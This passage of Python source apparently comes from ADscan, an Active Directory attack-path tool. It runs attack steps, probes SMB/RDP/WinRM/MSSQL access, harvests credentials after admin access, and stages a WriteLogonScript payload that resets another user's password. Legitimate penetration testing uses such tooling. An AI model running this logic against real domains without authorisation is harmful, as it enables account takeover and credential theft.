                event_stage="path_blocked",
                message="Attack path execution blocked because one or more steps are not implemented.",
                step_status="blocked",
                reason=", ".join(unsupported),
            )
            unsupported_actions = {
                str(action).strip().lower(): "Not implemented yet in ADscan"
                for action in unsupported
            }
            _mark_blocked_steps(
                kinds=unsupported_actions,
                kind_label="unsupported",
                default_reason="Not implemented yet in ADscan",
            )
            table = Table(
                title=Text("Steps in this path", style=f"bold {BRAND_COLORS['info']}"),
                show_header=True,
                header_style=f"bold {BRAND_COLORS['info']}",
                show_lines=True,
            )
            table.add_column("#", style="dim", width=4, justify="right")
            table.add_column("Action", style="bold")
            table.add_column("Supported", style="bold", width=10, justify="center")
            table.add_column("Notes", style="dim", overflow="fold")

            if isinstance(steps, list) and steps:
                for idx, step in enumerate(steps, start=1):
                    action = (
                        str(step.get("action") or "").strip()
                        if isinstance(step, dict)
                        else ""
                    )
                    key = action.lower()
                    if key in supported_actions:
                        supported_label = Text("Yes", style="bold green")
                        notes = supported_actions.get(key, "")
                    elif key in non_executable_actions:
                        supported_label = Text("N/A", style="bold cyan")
                        notes = non_executable_actions.get(key, "")
                    elif key in dangerous_actions:
                        supported_label = Text("No", style="bold yellow")
                        notes = dangerous_actions.get(key, "")
                    else:
                        supported_label = Text("No", style="bold red")
                        notes = "Not implemented yet in ADscan"
                    table.add_row(str(idx), action or "N/A", supported_label, notes)
            else:
                table.add_row(
                    "1", "N/A", Text("No", style="bold red"), "No steps available"
                )

            message = Text()
            message.append(
                "This attack path can't be executed yet.\n\n", style="bold red"
            )
            message.append(
                "ADscan does not have an exploitation implementation for this path yet. "
                "You can still inspect it and choose another one.\n",
                style="red",
            )
            if unique_actions:
                message.append(
                    f"\nDetected actions: {', '.join(unique_actions)}\n",
                    style="dim",
                )
            message.append(
                "\nTip: pick a path that contains only supported actions, "
                "or continue with other enumeration steps.",
                style="dim",
            )

            print_panel(
                [message, table],
                title=Text("Attack Path Not Implemented", style="bold red"),
                border_style="red",
                expand=False,
            )
            return False

        execution_started = False
        implicitly_satisfied_step_indices: set[int] = set()
        if not isinstance(steps, list) or not steps:
            _record_attack_path_execution_event(
                shell,
                domain=domain,
                summary=summary,
                event_stage="path_unavailable",
                message="Attack path execution unavailable because no steps were present.",
                step_status="unavailable",
                reason="no_steps_available",
            )
            print_warning("Cannot execute this path: no steps available.")
            return False

        # Precompute the last executable step index to avoid offering follow-ups
        # in the middle of a path (which can cause duplication or re-ordering).
        executable_indices: list[int] = []
        for step_idx, step_item in enumerate(steps, start=1):
            if not isinstance(step_item, dict):
                continue
            step_action = str(step_item.get("action") or "").strip()
            step_key = step_action.lower()
            if step_key in non_executable_actions:
                continue
            if step_key in dangerous_actions:
                continue
            executable_indices.append(step_idx)
        last_executable_idx = executable_indices[-1] if executable_indices else 0
        resume_from_step_idx = _resolve_attack_path_start_step(
            shell,
            domain=domain,
            steps=steps,
            executable_indices=executable_indices,
            non_executable_actions=non_executable_actions,
            dangerous_actions=dangerous_actions,
            summary=summary,
            context_username=context_username,
            context_password=context_password,
        )
        if resume_from_step_idx is None:
            _record_attack_path_execution_event(
                shell,
                domain=domain,
                summary=summary,
                event_stage="path_cancelled",
                message="Attack path execution cancelled before any step was started.",
                step_status="cancelled",
            )
            return False

        total_executable_steps = _count_executable_steps(
            steps,
            non_executable_actions=non_executable_actions,
            dangerous_actions=dangerous_actions,
        )
        _record_attack_path_execution_event(
            shell,
            domain=domain,
            summary=summary,
            event_stage="path_started",
            message="Attack path execution started.",
            step_index=resume_from_step_idx,
            total_steps=total_executable_steps,
            last_executable_idx=last_executable_idx,
            step_status="running",
        )
        _attempt_writelogonscript_cleanup_if_ready(
            shell,
            domain=domain,
            summary=summary,
        )

        def _run_runtime_followups(
            *,
            step_action: str,
            target_label_value: str,
            initial_followups: list[Any] | None = None,
            last_outcome: dict[str, Any] | None = None,
        ) -> None:
            """Render and execute runtime follow-ups for a successful terminal step."""
            followups = list(initial_followups or [])
            outcome_followups: list[Any] = []
            effective_outcome = (
                dict(last_outcome)
                if isinstance(last_outcome, dict)
                else (get_last_ace_execution_outcome(shell) or {})
            )
            outcome_key = str(effective_outcome.get("key") or "").strip().lower()
            step_context = get_attack_path_step_context(shell)
            terminal_class = (
                str(step_context.get("target_terminal_class") or "").strip().lower()
            )
            is_direct_compromise_credential = (
                outcome_key == "user_credential_obtained"
                and terminal_class == "direct_compromise"
            )
            marked_outcome_domain = mark_sensitive(domain, "domain")
            print_info_debug(
                "[attack_paths] outcome follow-up evaluation: "
                f"domain={marked_outcome_domain} pivot={is_pivot_search!r} "
                f"outcome_key={mark_sensitive(str(outcome_key or 'none'), 'detail')} "
                f"terminal_class={mark_sensitive(terminal_class or 'none', 'detail')}"
            )
            should_evaluate_outcome_followups = (
                is_pivot_search
                or outcome_key in {
                    "rbcd_prepared",
                    "rodc_host_access_prepared",
                    # Group membership was changed via GenericAll/GenericWrite/AddMember.
                    # The added user may now access new hosts/shares — probe them while
                    # they're still in the group; cleanup rollback fires in the finally
                    # block AFTER these followups complete.
                    "group_membership_changed",
                }
                or is_direct_compromise_credential
            )
            if should_evaluate_outcome_followups:
                if (
                    outcome_key != "user_credential_obtained"
                    or is_direct_compromise_credential
                ):
                    outcome_followups = build_followups_for_execution_outcome(
                        shell,
                        outcome=effective_outcome,
                    )
                else:
                    followup_context = get_attack_path_followup_context(shell)
                    compromised_user = _normalize_account(
                        str(effective_outcome.get("compromised_user") or "")
                    )
                    print_info_debug(
                        "[attack_paths] user-credential outcome follow-ups "
                        "deferred to credential-ingestion flow: "
                        f"user={mark_sensitive(compromised_user or 'unknown', 'user')} "
                        f"nested_followup_active={bool(followup_context)!r} "
                        f"context={mark_sensitive(str(followup_context or {}), 'detail')}"
                    )
                print_info_debug(
                    "[attack_paths] outcome follow-ups resolved: "
                    f"domain={marked_outcome_domain} count={len(outcome_followups)}"
                )
            if outcome_followups:
                mandatory_outcome_followups = [
                    item for item in outcome_followups if item.key == "refresh_ticket"
                ]
                optional_outcome_followups = [
                    item for item in outcome_followups if item.key != "refresh_ticket"
                ]
                for item in mandatory_outcome_followups:
                    item.handler()
                followups.extend(optional_outcome_followups)
            if not followups:
                return

            execute_guided_followup_actions(
                shell,
                step_action=step_action,
                target_label=target_label_value,
                followups=followups,
            )

        def _apply_execution_outcome_context_handoff(
            outcome: dict[str, Any] | None,
        ) -> None:
            """Update the in-path execution context after obtaining a new user credential."""
            nonlocal context_username, context_password

            if not isinstance(outcome, dict):
                return
            if (
                str(outcome.get("key") or "").strip().lower()
                != "user_credential_obtained"
            ):
                return

            compromised_user = _normalize_account(
                str(outcome.get("compromised_user") or "")
            )
            credential = str(outcome.get("credential") or "").strip()
            if not compromised_user or not credential:
                print_info_debug(
                    "[attack_paths] skipping execution-context handoff for user outcome "
                    "(missing compromised_user or credential)."
                )
                return

            previous_user = _normalize_account(context_username or "")
            context_username = compromised_user
            context_password = credential
            marked_user = mark_sensitive(compromised_user, "user")
            followup_context = get_attack_path_followup_context(shell)
            print_info_debug(
                "[attack_paths] execution context handed off to newly compromised user: "
                f"previous_user={mark_sensitive(previous_user or 'none', 'detail')} "
                f"new_user={marked_user} "
                f"nested_followup_active={bool(followup_context)!r} "
                f"context={mark_sensitive(str(followup_context or {}), 'detail')}"
            )

            # Centralised active-step success transition. Any action that
            # produces a ``user_credential_obtained`` outcome (ESC1..15 PKINIT,
            # GenericAll/WriteOwner/AddKeyCredentialLink shadow-creds path,
            # kerberoasting, AS-REP roasting, secretsdump, etc.) converges
            # here. Without this, every handler would need to remember to
            # update the edge status manually on success and a future ESC16
            # would silently leave the edge stuck on "attempted".
            try:
                from adscan_internal.services.attack_graph_runtime_service import (
                    update_active_step_status,
                )

                source_action = str(outcome.get("source_action") or "").strip()
                update_active_step_status(
                    shell,
                    domain=domain,
                    status="success",
                    notes={
                        "compromised_user": compromised_user,
                        "credential_type": str(outcome.get("credential_type") or ""),
                        "source_action": source_action,
                    },
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)

        def _mark_step_implicitly_satisfied(
            *,
            step_index: int,
            status: str,
            notes: dict[str, Any] | None = None,
        ) -> None:
            """Mark one step as satisfied by another action during the same execution."""
            implicitly_satisfied_step_indices.add(step_index + 1)
            _update_attack_path_step_status_at_index(
                shell,
                domain=domain,
                summary=summary,
                step_index=step_index,
                status=status,
                notes=notes,
            )

        def _apply_chained_step_execution_result(
            *,
            source_action: str,
            source_from_label: str,
            source_to_label: str,
            execution_result: dict[str, Any],
        ) -> bool:
            """Apply one chained-step result produced by the active step.

            Returns ``True`` when the attack path should continue automatically.
            """
            chained_step_index = int(execution_result.get("step_index") or -1)
            chained_status = str(execution_result.get("status") or "").strip().lower()
            chained_action = str(execution_result.get("action") or "").strip()
            chained_from_label = str(execution_result.get("from_label") or "").strip()
            chained_to_label = str(execution_result.get("to_label") or "").strip()
            chained_notes = (
                dict(execution_result.get("notes"))
                if isinstance(execution_result.get("notes"), dict)
                else {}
            )
            if chained_step_index < 0 or not chained_status:
                return False

            if chained_status == "success":
                _mark_step_implicitly_satisfied(
                    step_index=chained_step_index,
                    status="success",
                    notes=chained_notes,
                )
                _record_attack_path_execution_event(
                    shell,
                    domain=domain,
                    summary=summary,
                    event_stage="step_succeeded",
                    message=(
                        f"{chained_action or 'Chained step'} succeeded against "
                        f"{chained_to_label or 'the downstream target'} via {source_action}."
                    ),
                    step_index=chained_step_index + 1,
                    total_steps=total_executable_steps,
                    executable_step_index=chained_step_index + 1,
                    last_executable_idx=last_executable_idx,
                    action=chained_action,
                    from_label=chained_from_label,
                    to_label=chained_to_label,
                    step_status="success",
                    actor=str(execution_result.get("actor") or ""),
                    reason=str(
                        execution_result.get("reason")
                        or f"executed_via_{source_action.lower()}"
                    ),
                )
                follow_on_outcome = execution_result.get("follow_on_outcome")
                if isinstance(follow_on_outcome, dict):
                    _apply_execution_outcome_context_handoff(follow_on_outcome)
                return True

            _update_attack_path_step_status_at_index(
                shell,
                domain=domain,
                summary=summary,
                step_index=chained_step_index,
                status=chained_status,
                notes=chained_notes,
            )
            _record_attack_path_execution_event(
                shell,
                domain=domain,
                summary=summary,
                event_stage="step_failed"
                if chained_status == "failed"
                else "step_blocked"
                if chained_status == "blocked"
                else "step_started",
                message=(
                    f"{chained_action or 'Chained step'} ended with status "
                    f"{chained_status} after {source_action}."
                ),
                step_index=chained_step_index + 1,
                total_steps=total_executable_steps,
                executable_step_index=chained_step_index + 1,
                last_executable_idx=last_executable_idx,
                action=chained_action,
                from_label=chained_from_label,
                to_label=chained_to_label,
                step_status=chained_status,
                actor=str(execution_result.get("actor") or ""),
                reason=str(
                    execution_result.get("reason")
                    or f"{chained_status}_via_{source_action.lower()}"
                ),
            )
            return False

        def _confirm_step_rerun(prompt: str, *, default: bool) -> bool:
            """Return a rerun decision while honoring non-interactive defaults."""
            if hasattr(shell, "_questionary_confirm"):
                resolved = shell._questionary_confirm(
                    prompt,
                    default=default,
                    timeout_result=False,
                    context={
                        "remote_interaction": True,
                        "category": "attack_path_execution",
                        "domain": domain,
                    },
                )
                if isinstance(resolved, bool):
                    return resolved
            if is_non_interactive(shell):
                print_info_debug(
                    "[attack_paths] step rerun defaulted (non-interactive): "
                    f"domain={mark_sensitive(domain, 'domain')} "
                    f"prompt={mark_sensitive(prompt, 'detail')} default={default!r}"
                )
                return default
            return Confirm.ask(prompt, default=default)

        def _decide_existing_step_handling(
            *,
            step: dict[str, Any],
            step_index: int,
            action: str,
            from_label: str,
            to_label: str,
        ) -> str:
            """Return `execute`, `skip`, or `cancel` for one previously processed step."""
            status = str(step.get("status") or "").strip().lower()
            if status not in {"success", "attempted"}:
                return "execute"
            if step_index in implicitly_satisfied_step_indices:
                print_info_debug(
                    "[attack_paths] skipping implicitly satisfied step in current execution: "
                    f"index={step_index} status={mark_sensitive(status, 'detail')} "
                    f"action={mark_sensitive(action or 'N/A', 'detail')}"
                )
                return "skip"
            if status == "success" and _env_flag_enabled(
                "ADSCAN_ATTACK_PATH_RERUN_SUCCESS_STEPS"
            ):
                print_info_debug(
                    "[attack_paths] forcing success-step re-execution via env flag: "
                    f"index={step_index} action={mark_sensitive(action or 'N/A', 'detail')}"
                )
                return "execute"

            bypassable = _attack_path_processed_step_is_bypassable(
                shell,
                domain=domain,
                summary=summary,
                steps=steps,
                executable_indices=executable_indices,
                step_index=step_index,
                step_status=status,
                context_username=context_username,
                context_password=context_password,
            )
            if bypassable:
                if status == "success":
                    prompt = (
                        f"Step #{step_index} ({action}) is already marked success and "
                        "ADscan can continue without re-running it. Re-run it anyway?"
                    )
                else:
                    prompt = (
                        f"Step #{step_index} ({action}) was already attempted, but ADscan "
                        "can continue without re-running it. Re-run it anyway?"
                    )
            elif status == "success":
                prompt = (
                    f"Step #{step_index} ({action}) is marked success, but ADscan cannot "
                    "continue from it with the currently available credentials. Re-run it now?"
                )
            else:
                prompt = (
                    f"Step #{step_index} ({action}) was already attempted and ADscan cannot "
                    "continue past it with the currently available credentials. Retry it now?"
                )
            rerun = _confirm_step_rerun(prompt, default=False)
            print_info_debug(
                "[attack_paths] existing-step rerun decision: "
                f"index={step_index} status={mark_sensitive(status, 'detail')} "
                f"action={mark_sensitive(action or 'N/A', 'detail')} "
                f"from={mark_sensitive(from_label or 'N/A', 'node')} "
                f"to={mark_sensitive(to_label or 'N/A', 'node')} "
                f"bypassable={bypassable!r} "
                f"rerun={rerun!r}"
            )
            if rerun:
                return "execute"
            if bypassable:
                return "skip"
            return "cancel"

        for idx, step in enumerate(steps, start=1):
            if not isinstance(step, dict):
                continue
            if idx < resume_from_step_idx:
                continue
            action = str(step.get("action") or "").strip()
            key = action.lower()
            if key in non_executable_actions:
                # Context-only edge (e.g. membership expansion), skip execution.
                continue
            if key in dangerous_actions:
                # High-risk step intentionally disabled.
                return execution_started
            relation_support = classify_relation_support(key)
            set_attack_path_step_context(
                shell,
                search_mode_label=search_mode_label,
                step_index=idx,
                last_executable_idx=last_executable_idx,
                compromise_semantics=relation_support.compromise_semantics,
                compromise_effort=relation_support.compromise_effort,
                effective_target_basis_kind=str(
                    summary.get("effective_target_basis_kind") or ""
                ),
                effective_target_basis_primary=(
                    summary.get("effective_target_basis_primary")
                    if isinstance(summary.get("effective_target_basis_primary"), dict)
                    else None
                ),
                target_terminal_class=str(summary.get("target_terminal_class") or ""),
                target_followup_status=str(summary.get("target_followup_status") or ""),
            )
            details = (
                step.get("details") if isinstance(step.get("details"), dict) else {}
            )
            from_label = str(details.get("from") or "")
            to_label = str(details.get("to") or "")
            existing_step_decision = _decide_existing_step_handling(
                step=step,
                step_index=idx,
                action=action,
                from_label=from_label,
                to_label=to_label,
            )
            if existing_step_decision == "skip":
                print_info_debug(
                    "[attack_paths] skipping previously processed step: "
                    f"index={idx} status={mark_sensitive(str(step.get('status') or ''), 'detail')} "
                    f"action={mark_sensitive(action, 'detail')} "
                    f"from={mark_sensitive(from_label or 'N/A', 'node')} "
                    f"to={mark_sensitive(to_label or 'N/A', 'node')}"
                )
                continue
            if existing_step_decision == "cancel":
                print_info_debug(
                    "[attack_paths] cancelling path execution because a previously processed "
                    "step cannot be bypassed with the current credentials: "
                    f"index={idx} action={mark_sensitive(action, 'detail')}"
                )
                return execution_started
            executable_step_position = 0
            if executable_indices:
                try:
                    executable_step_position = executable_indices.index(idx) + 1
                except ValueError:
                    executable_step_position = 0

            if key in {"adminto", "sqlaccess", "sqladmin", "canrdp", "canpsremote"}:
                if not to_label:
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: missing target host.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="missing_target_host",
                    )
                    print_warning(f"Cannot execute {action}: missing target host.")
                    return execution_started

                # Prefer the credential context (e.g. from `ask_for_user_privs`). Otherwise,
                # attempt to use the credential for the source node, and finally fall back
                # to one of the "applies_to" usernames when available (owned/group paths).
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )

                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not exec_username or not password:
                    marked_user = mark_sensitive(exec_username or from_label, "user")
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: no usable credential context was available.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="missing_execution_credential",
                    )
                    print_warning(
                        f"Cannot execute this step: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing credential context for execution",
                    )
                    return execution_started

                # Resolve a usable NetExec target (FQDN), falling back when needed.
                target_host = resolve_netexec_target_for_node_label(
                    shell, domain, node_label=to_label
                )
                if not isinstance(target_host, str) or not target_host.strip():
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: target node is not a resolvable host.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="target_not_resolvable_host",
                    )
                    print_warning(
                        f"Cannot execute {action}: target node is not a resolvable host."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Target node is not a resolvable host",
                    )
                    return execution_started
                target_host = target_host.strip()

                service_map: dict[str, str] = {
                    "adminto": "smb",
                    "sqlaccess": "mssql",
                    "sqladmin": "mssql",
                    "canrdp": "rdp",
                    "canpsremote": "winrm",
                }
                service = service_map[key]
                require_admin = key in {"adminto", "sqladmin"}

                try:
                    is_hash = bool(shell.is_hash(password))
                except Exception:  # noqa: BLE001
                    is_hash = False

                kdc_ip: str | None = None
                try:
                    kdc_ip = resolve_dc_ip(
                        (getattr(shell, "domains_data", {}) or {}).get(domain, {}) or {}
                    )
                except Exception:  # noqa: BLE001
                    kdc_ip = None

                marked_user = mark_sensitive(exec_username, "user")
                marked_target = mark_sensitive(target_host, "hostname")
                print_info_verbose(
                    f"Verifying {action} on {marked_target} as {marked_user} "
                    f"via native {service} probe."
                )

                execution_started = True
                _record_attack_path_execution_event(
                    shell,
                    domain=domain,
                    summary=summary,
                    event_stage="step_attempting",
                    message=f"Attempting {action} on {to_label or target_host}.",
                    step_index=idx,
                    total_steps=total_executable_steps,
                    executable_step_index=executable_step_position,
                    last_executable_idx=last_executable_idx,
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    step_status="attempting",
                    actor=exec_username,
                    target_host=target_host,
                )
                with _active_step_context(
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    notes={"username": exec_username, "target": target_host},
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation=action,
                            to_label=to_label,
                            status="attempted",
                            notes={"username": exec_username, "target": target_host},
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    ok, verify_reason, verify_detail = run_async_sync(
                        _verify_attack_step_native(
                            service=service,
                            require_admin=require_admin,
                            domain=domain,
                            username=exec_username,
                            secret=password,
                            is_hash=is_hash,
                            target_host=target_host,
                            target_hostname=target_host,
                            kdc_ip=kdc_ip,
                            workspace_dir=str(
                                getattr(shell, "current_workspace_dir", "")
                                or ""
                            )
                            or None,
                        )
                    )
                    print_info_debug(
                        f"[attack_paths] native {service} verifier: {verify_detail} reason={verify_reason.value}"
                    )
                    if not ok:
                        # Edge status depends on WHY it failed, not just that it failed.
                        # HOST_OFFLINE / SERVICE_DOWN → keep edge as "unavailable" (temporary)
                        # NO_PRIVILEGE → "failed" (potentially stale edge)
                        # AUTH_FAILED  → "attempted" (credential issue, not an edge issue)
                        edge_status_on_fail = {
                            _VerifyFailReason.HOST_OFFLINE: "unavailable",
                            _VerifyFailReason.SERVICE_DOWN: "unavailable",
                            _VerifyFailReason.NO_PRIVILEGE: "failed",
                            _VerifyFailReason.AUTH_FAILED: "attempted",
                            _VerifyFailReason.UNKNOWN: "unavailable",
                        }.get(verify_reason, "failed")

                        try:
                            update_edge_status_by_labels(
                                shell,
                                domain,
                                from_label=from_label,
                                relation=action,
                                to_label=to_label,
                                status=edge_status_on_fail,
                                notes={
                                    "username": exec_username,
                                    "target": target_host,
                                    "fail_reason": verify_reason.value,
                                    "verify_detail": verify_detail,
                                },
                            )
                        except Exception as exc:  # noqa: BLE001
                            telemetry.capture_exception(exc)

                        _record_attack_path_execution_event(
                            shell,
                            domain=domain,
                            summary=summary,
                            event_stage="step_failed",
                            message=f"{action} did not confirm access on {to_label or target_host}. Reason: {verify_reason.value}.",
                            step_index=idx,
                            total_steps=total_executable_steps,
                            executable_step_index=executable_step_position,
                            last_executable_idx=last_executable_idx,
                            action=action,
                            from_label=from_label,
                            to_label=to_label,
                            step_status=edge_status_on_fail,
                            actor=exec_username,
                            target_host=target_host,
                            reason=verify_reason.value,
                        )
                        _show_verify_failure_panel(
                            action=action,
                            host=target_host,
                            reason=verify_reason,
                            username=exec_username,
                        )
                        return True

                    update_edge_status_by_labels(
                        shell,
                        domain,
                        from_label=from_label,
                        relation=action,
                        to_label=to_label,
                        status="success",
                        notes={"username": exec_username, "target": target_host},
                    )
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_succeeded",
                        message=f"{action} succeeded against {to_label or target_host}.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="success",
                        actor=exec_username,
                        target_host=target_host,
                    )

                    if key == "adminto":
                        _attempt_post_adminto_credential_harvest(
                            shell,
                            domain=domain,
                            steps=steps,
                            current_step_index=idx - 1,
                            compromised_host_label=to_label,
                            exec_username=exec_username,
                            exec_password=password,
                            resolved_target_host=target_host,
                        )

                    # Single-responsibility (mirrors the ACE terminal-gate at the
                    # offer_followups site): the access followup runs DumpSAM/
                    # DumpLSA/DumpDPAPI/DumpLSASS, each of which is its OWN graph
                    # edge. Only chain it when this access step is the LAST
                    # executable step — for an intermediate AdminTo the path
                    # runner executes the dump edge next, so chaining here would
                    # double-run the dump (and double-prompt).
                    followup = getattr(shell, f"ask_for_{service}_access", None)
                    if callable(followup) and idx == last_executable_idx:
                        followup(domain, target_host, exec_username, password)
                continue

            if key == "writelogonscript":
                if not from_label or not to_label:
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: missing path endpoint details.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="missing_from_to_details",
                    )
                    print_warning(f"Cannot execute {action}: missing from/to details.")
                    return execution_started

                execution_started = True
                _record_attack_path_execution_event(
                    shell,
                    domain=domain,
                    summary=summary,
                    event_stage="step_attempting",
                    message=f"Attempting {action} staging-share precheck on {to_label}.",
                    step_index=idx,
                    total_steps=total_executable_steps,
                    executable_step_index=executable_step_position,
                    last_executable_idx=last_executable_idx,
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    step_status="attempting",
                )
                probe_state, probe_notes = _execute_writelogonscript_precheck(
                    shell,
                    domain=domain,
                    summary=summary,
                    from_label=from_label,
                    to_label=to_label,
                    details=details,
                    context_username=context_username,
                    context_password=context_password,
                )
                _update_attack_path_edge_status(
                    shell,
                    domain,
                    from_label=from_label,
                    relation=action,
                    to_label=to_label,
                    status=(
                        "attempted"
                        if probe_state == "precheck_succeeded"
                        else "failed"
                        if probe_state == "failed"
                        else "blocked"
                    ),
                    notes=probe_notes,
                )
                if probe_state == "blocked":
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: no usable execution credential context was available.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason=str(
                            probe_notes.get("reason") or "no_usable_execution_context"
                        ),
                        actor=str(probe_notes.get("user") or ""),
                    )
                    print_warning(
                        f"Cannot execute {action}: no usable execution credential context available."
                    )
                    return execution_started
                if probe_state == "failed":
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_failed",
                        message=f"{action} staging-share write precheck failed on {to_label}.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="failed",
                        actor=str(probe_notes.get("user") or ""),
                        reason=str(
                            probe_notes.get("reason") or "netlogon_write_probe_failed"
                        ),
                    )
                    print_warning(
                        f"{action} precheck failed: could not upload a benign probe file to any supported staging share."
                    )
                    return execution_started

                _record_attack_path_execution_event(
                    shell,
                    domain=domain,
                    summary=summary,
                    event_stage="step_succeeded",
                    message=f"{action} staging-share write precheck succeeded on {to_label}.",
                    step_index=idx,
                    total_steps=total_executable_steps,
                    executable_step_index=executable_step_position,
                    last_executable_idx=last_executable_idx,
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    step_status="attempted",
                    actor=str(probe_notes.get("user") or ""),
                    reason=str(
                        probe_notes.get("reason") or "netlogon_write_probe_succeeded"
                    ),
                )
                strategy_state, strategy_notes = (
                    _execute_writelogonscript_force_change_password_strategy(
                        shell,
                        domain=domain,
                        summary=summary,
                        current_step_index=idx - 1,
                        from_label=from_label,
                        to_label=to_label,
                        details=details,
                        context_username=context_username,
                        context_password=context_password,
                        precheck_notes=probe_notes,
                    )
                )
                if strategy_state == "payload_staged":
                    final_notes = dict(details)
                    final_notes.update(probe_notes)
                    final_notes.update(strategy_notes)
                    step["status"] = "success"
                    step["details"] = final_notes
                    _update_attack_path_edge_status(
                        shell,
                        domain,
                        from_label=from_label,
                        relation=action,
                        to_label=to_label,
                        status="success",
                        notes=final_notes,
                    )
                    print_info(
                        "WriteLogonScript payload staged: the script was uploaded and scriptPath was updated. "
                        f"When {mark_sensitive(to_label, 'user')} logs on, the payload should run and reset "
                        f"{mark_sensitive(str(strategy_notes.get('next_step_target_user') or ''), 'user')}."
                    )
                    validation_policy = _get_writelogonscript_lockout_policy_state(
                        shell,
                        domain=domain,
                        username=str(strategy_notes.get("user") or ""),
                        password=str(
                            context_password
                            or _resolve_domain_password(
                                shell, domain, str(strategy_notes.get("user") or "")
                            )
                            or ""
                        ),
                    )
                    final_notes["validation_policy"] = validation_policy
                    if not bool(validation_policy.get("auto_validation_safe")):
                        final_notes.update(
                            {
                                "verification_status": "manual_required",
                                "manual_validation_required": True,
                                "target_login_required": True,
                            }
                        )
                        step["status"] = "success"
                        step["details"] = final_notes
                        _update_attack_path_edge_status(
                            shell,
                            domain,
                            from_label=from_label,
                            relation=action,
                            to_label=to_label,
                            status="success",
                            notes=final_notes,
                        )
                        register_writelogonscript_manual_validation(
                            shell,
                            domain=domain,
                            username=str(
                                strategy_notes.get("next_step_target_user") or ""
                            ),
                            credential=str(
                                strategy_notes.get("generated_password") or ""
                            ),
                            summary=summary,
                            from_label=from_label,
                            to_label=to_label,
                        )
                        _render_writelogonscript_manual_validation_panel(
                            domain=domain,
                            target_user=str(
                                strategy_notes.get("next_step_target_user") or ""
                            ),
                            credential=str(
                                strategy_notes.get("generated_password") or ""
                            ),
                            policy_state=validation_policy,
                        )
                        return execution_started
                    poll_notes = _poll_writelogonscript_followup_credential(
                        shell,
                        domain=domain,
                        summary=summary,
                        from_label=from_label,
                        to_label=to_label,
                        target_user=str(
                            strategy_notes.get("next_step_target_user") or ""
                        ),
                        target_password=str(
                            strategy_notes.get("generated_password") or ""
                        ),
                    )
                    final_notes.update(poll_notes)
                    step["status"] = "success"
                    step["details"] = final_notes
                    _update_attack_path_edge_status(
                        shell,
                        domain,
                        from_label=from_label,
                        relation=action,
                        to_label=to_label,
                        status="success",
                        notes=final_notes,
                    )
                    if str(poll_notes.get("verification_status") or "") == "confirmed":
                        chained_step_notes = {
                            "verification_status": "executed_via_writelogonscript",
                            "execution_origin_action": action,
                            "execution_origin_from": from_label,
                            "execution_origin_to": to_label,
                            "credential_confirmed_user": str(
                                strategy_notes.get("next_step_target_user") or ""
                            ),
                            "credential_confirmed_at": str(
                                poll_notes.get("verification_completed_at") or ""
                            ),
                            "credential_confirmed_wait_seconds": int(
                                poll_notes.get("verification_wait_seconds") or 0
                            ),
                        }
                        continue_path = _apply_chained_step_execution_result(
                            source_action=action,
                            source_from_label=from_label,
                            source_to_label=to_label,
                            execution_result={
                                "step_index": int(
                                    strategy_notes.get("chained_step_index") or -1
                                ),
                                "action": str(
                                    strategy_notes.get("chained_step_action")
                                    or strategy_notes.get("next_step_action")
                                    or ""
                                ),
                                "from_label": str(
                                    strategy_notes.get("chained_step_from_label")
                                    or to_label
                                    or ""
                                ),
                                "to_label": str(
                                    strategy_notes.get("chained_step_to_label") or ""
                                ),
                                "status": "success",
                                "notes": chained_step_notes,
                                "actor": str(strategy_notes.get("user") or ""),
                                "reason": "executed_via_writelogonscript",
